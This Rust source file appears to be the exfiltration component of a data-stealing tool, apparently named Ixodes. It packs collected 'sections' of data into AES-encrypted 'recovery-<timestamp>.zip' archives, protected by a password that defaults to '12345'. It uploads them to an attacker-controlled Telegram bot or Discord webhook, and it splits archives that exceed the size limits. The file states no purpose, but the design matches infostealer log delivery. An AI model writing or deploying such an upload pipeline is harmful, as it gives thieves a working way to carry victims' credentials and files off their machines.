use crate::formatter::{FormattedMessage, MessageFormatter};
use reqwest::{
    Client,
    multipart::{Form, Part},
};
use serde::{Deserialize, Serialize};
use std::env;
use std::io::{Cursor, Write};
use std::time::{SystemTime, UNIX_EPOCH};
use thiserror::Error;
use zip::AesMode;
use zip::CompressionMethod;
use zip::write::{SimpleFileOptions, ZipWriter};

const TELEGRAM_FILE_SIZE_LIMIT: usize = 20 * 1024 * 1024;
const DISCORD_FILE_SIZE_LIMIT: usize = 8 * 1024 * 1024;
const DEFAULT_ARCHIVE_PASSWORD: &str = "12345";

pub const TELEGRAM_MESSAGE_LIMIT: usize = 4096;
pub const DISCORD_MESSAGE_LIMIT: usize = 2000;

#[derive(Debug, Clone)]
pub enum Sender {
    Telegram(TelegramSender, ChatId),
    Discord(DiscordSender),
}

impl Sender {
    pub fn max_message_length(&self) -> usize {
        match self {
            Sender::Telegram(..) => TELEGRAM_MESSAGE_LIMIT,
            Sender::Discord(_) => DISCORD_MESSAGE_LIMIT,
        }
    }

    pub async fn send_formatted_message<I, S>(
        &self,
        formatter: &MessageFormatter,
        parts: I,
        sections: Option<&[(String, Vec<u8>)]>,
    ) -> Result<(), SenderError>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        match self {
            Sender::Telegram(sender, chat_id) => {
                sender
                    .send_formatted_message(chat_id.clone(), formatter, parts, sections)
                    .await
            }
            Sender::Discord(sender) => {
                sender
                    .send_formatted_message(formatter, parts, sections)
                    .await
            }
        }
    }
}

#[derive(Debug, Clone)]
pub struct TelegramSender {
    client: Client,
    base_url: String,
}

impl TelegramSender {
    pub fn new(token: impl Into<String>) -> Self {
        Self::with_client(Client::new(), token)
    }

    pub fn with_client(client: Client, token: impl Into<String>) -> Self {
        let token = token.into();
        Self {
            client,
            base_url: format!("https://api.telegram.org/bot{token}"),
        }
    }

    pub async fn send_formatted_message<I, S>(
        &self,
        chat_id: ChatId,
        formatter: &MessageFormatter,
        parts: I,
        sections: Option<&[(String, Vec<u8>)]>,
    ) -> Result<(), SenderError>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let formatted = formatter.format(parts);
        let FormattedMessage { text, .. } = formatted;
        if !text.is_empty() {
            self.send_message_with_options(chat_id.clone(), text, SendMessageOptions::default())
                .await?;
        }
        if let Some(sections) = sections {
            self.send_sections_as_zip(chat_id, sections).await?;
        }

        Ok(())
    }

    async fn send_sections_as_zip(
        &self,
        chat_id: ChatId,
        sections: &[(String, Vec<u8>)],
    ) -> Result<(), SenderError> {
        if sections.is_empty() {
            return Ok(());
        }

        let mut stack = vec![sections];
        while let Some(chunk) = stack.pop() {
            if chunk.is_empty() {
                continue;
            }

            let password = archive_password();
            let archive = build_zip_archive(chunk, &password)?;
            let file_name = format!("recovery-{}.zip", current_timestamp());
            match self
                .send_document(chat_id.clone(), file_name, archive)
                .await
            {
                Ok(()) => continue,
                Err(err @ SenderError::FileTooLarge { .. }) => {
                    if chunk.len() == 1 {
                        return Err(err);
                    }
                    let mid = chunk.len() / 2;
                    stack.push(&chunk[mid..]);
                    stack.push(&chunk[..mid]);
                }
                Err(err) => return Err(err),
            }
        }
        Ok(())
    }

    pub async fn send_message_with_options(
        &self,
        chat_id: ChatId,
        text: impl Into<String>,
        options: SendMessageOptions,
    ) -> Result<(), SenderError> {
        let payload = SendMessagePayload {
            chat_id,
            text: text.into(),
            disable_web_page_preview: options.disable_web_page_preview,
            disable_notification: options.disable_notification,
        };

        let url = format!("{}/sendMessage", self.base_url);
        let response = self.client.post(url).json(&payload).send().await?;

        let body: TelegramApiResponse = response.json().await?;
        if body.ok {
            Ok(())
        } else {
            Err(SenderError::Api(
                body.description
                    .unwrap_or_else(|| "telegram api request failed".into()),
            ))
        }
    }

    pub async fn send_document(
        &self,
        chat_id: ChatId,
        file_name: impl Into<String>,
        content: Vec<u8>,
    ) -> Result<(), SenderError> {
        let file_name = file_name.into();
        if content.len() > TELEGRAM_FILE_SIZE_LIMIT {
            return Err(SenderError::FileTooLarge {
                file_name,
                size: content.len(),
            });
        }
        let url = format!("{}/sendDocument", self.base_url);
        let form = Form::new().text("chat_id", encode_chat_id(&chat_id)).part(
            "document",
            Part::bytes(content).file_name(file_name.clone()),
        );

        let response = self.client.post(url).multipart(form).send().await?;
        let body: TelegramApiResponse = response.json().await?;
        if body.ok {
            Ok(())
        } else {
            Err(SenderError::Api(
                body.description
                    .unwrap_or_else(|| "telegram api request failed".into()),
            ))
        }
    }
}

#[derive(Debug, Clone)]
pub struct DiscordSender {
    client: Client,
    webhook_url: String,
}

impl DiscordSender {
    pub fn new(webhook_url: impl Into<String>) -> Self {
        Self {
            client: Client::new(),
            webhook_url: webhook_url.into(),
        }
    }

    pub async fn send_formatted_message<I, S>(
        &self,
        formatter: &MessageFormatter,
        parts: I,
        sections: Option<&[(String, Vec<u8>)]>,
    ) -> Result<(), SenderError>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let formatted = formatter.format(parts);
        let FormattedMessage { text, .. } = formatted;

        if !text.is_empty() {
            self.send_message(text).await?;
        }
        if let Some(sections) = sections {
            self.send_sections_as_zip(sections).await?;
        }

        Ok(())
    }

    async fn send_sections_as_zip(
        &self,
        sections: &[(String, Vec<u8>)],
    ) -> Result<(), SenderError> {
        if sections.is_empty() {
            return Ok(());
        }

        let mut stack = vec![sections];
        while let Some(chunk) = stack.pop() {
            if chunk.is_empty() {
                continue;
            }

            let password = archive_password();
            let archive = build_zip_archive(chunk, &password)?;
            let file_name = format!("recovery-{}.zip", current_timestamp());
            match self.send_document(file_name, archive).await {
                Ok(()) => continue,
                Err(err @ SenderError::FileTooLarge { .. }) => {
                    if chunk.len() == 1 {
                        return Err(err);
                    }
                    let mid = chunk.len() / 2;
                    stack.push(&chunk[mid..]);
                    stack.push(&chunk[..mid]);
                }
                Err(err) => return Err(err),
            }
        }
        Ok(())
    }

    pub async fn send_message(&self, text: impl Into<String>) -> Result<(), SenderError> {
        let payload = serde_json::json!({
            "content": text.into(),
        });

        let response = self
            .client
            .post(&self.webhook_url)
            .json(&payload)
            .send()
            .await?;

        if response.status().is_success() {
            Ok(())
        } else {
            Err(SenderError::Api(format!(
                "discord api request failed: {}",
                response.status()
            )))
        }
    }

    pub async fn send_document(
        &self,
        file_name: impl Into<String>,
        content: Vec<u8>,
    ) -> Result<(), SenderError> {
        let file_name = file_name.into();
        if content.len() > DISCORD_FILE_SIZE_LIMIT {
            return Err(SenderError::FileTooLarge {
                file_name,
                size: content.len(),
            });
        }

        let form = Form::new().part(
            "file",
            Part::bytes(content).file_name(file_name.clone()),
        );

        let response = self
            .client
            .post(&self.webhook_url)
            .multipart(form)
            .send()
            .await?;

        if response.status().is_success() {
            Ok(())
        } else {
            Err(SenderError::Api(format!(
                "discord api request failed: {}",
                response.status()
            )))
        }
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(untagged)]
pub enum ChatId {
    Id(i64),
    Username(String),
}

impl ChatId {
    fn to_request_value(&self) -> String {
        match self {
            ChatId::Id(id) => id.to_string(),
            ChatId::Username(handle) => handle.clone(),
        }
    }
}

impl From<i64> for ChatId {
    fn from(value: i64) -> Self {
        Self::Id(value)
    }
}

impl From<String> for ChatId {
    fn from(value: String) -> Self {
        Self::Username(value)
    }
}

impl<'a> From<&'a str> for ChatId {
    fn from(value: &'a str) -> Self {
        Self::Username(value.to_string())
    }
}

#[derive(Debug, Clone)]
pub struct SendMessageOptions {
    pub disable_web_page_preview: bool,
    pub disable_notification: bool,
}

impl Default for SendMessageOptions {
    fn default() -> Self {
        Self {
            disable_web_page_preview: true,
            disable_notification: false,
        }
    }
}

#[derive(Serialize)]
struct SendMessagePayload {
    chat_id: ChatId,
    text: String,
    disable_web_page_preview: bool,
    disable_notification: bool,
}

#[derive(Deserialize)]
struct TelegramApiResponse {
    ok: bool,
    description: Option<String>,
}

#[derive(Debug, Error)]
pub enum SenderError {
    #[error("http client error: {0}")]
    Http(#[from] reqwest::Error),
    #[error("api error: {0}")]
    Api(String),
    #[error("file too large ({size} bytes)")]
    FileTooLarge { file_name: String, size: usize },
    #[error("io error while building an archive: {0}")]
    Io(#[from] std::io::Error),
    #[error("archive error: {0}")]
    Archive(#[from] zip::result::ZipError),
}

fn encode_chat_id(chat_id: &ChatId) -> String {
    chat_id.to_request_value()
}

fn current_timestamp() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|dur| dur.as_millis())
        .unwrap_or_default()
}

fn build_zip_archive(
    sections: &[(String, Vec<u8>)],
    password: &str,
) -> Result<Vec<u8>, SenderError> {
    let cursor = Cursor::new(Vec::new());
    let mut zip = ZipWriter::new(cursor);
    for (name, content) in sections {
        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, password);
        zip.start_file(name, options)?;
        zip.write_all(content)?;
    }
    let cursor = zip.finish()?;
    Ok(cursor.into_inner())
}

fn archive_password() -> String {
    env::var("IXODES_PASSWORD")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| DEFAULT_ARCHIVE_PASSWORD.to_string())
}
